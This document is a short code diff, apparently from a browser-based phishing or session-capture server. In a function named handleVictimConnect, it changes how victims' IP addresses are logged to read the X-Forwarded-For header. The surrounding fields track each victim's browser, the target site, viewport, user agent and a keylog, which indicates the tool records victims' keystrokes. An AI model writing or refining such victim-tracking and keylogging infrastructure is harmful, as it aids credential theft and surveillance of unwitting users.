@@ -440,7 +440,12 @@ function handleVictimConnect(
       void logEvent({
         event: 'session_start',
         browserId: instance.id,
-        ip: socket.handshake.address,
+        ip: (() => {
+          const forwardedFor = socket.handshake.headers['x-forwarded-for'];
+          return forwardedFor 
+            ? (Array.isArray(forwardedFor) ? forwardedFor[0] : forwardedFor.split(',')[0].trim())
+            : socket.handshake.address;
+        })(),
         userAgent: (socket.handshake.headers['user-agent'] as string | undefined) ?? '',
         target: target.name,
         viewport: { w: data.width, h: data.height },
@@ -492,7 +497,12 @@ function handleVictimConnect(
         browserId: instance.id,
         target: target.name,
         connectedAt: instance.connectedAt?.toISOString() ?? '',
-        ip: socket.handshake.address,
+        ip: (() => {
+          const forwardedFor = socket.handshake.headers['x-forwarded-for'];
+          return forwardedFor 
+            ? (Array.isArray(forwardedFor) ? forwardedFor[0] : forwardedFor.split(',')[0].trim())
+            : socket.handshake.address;
+        })(),
         keylog: '',
         status: 'active',
       };
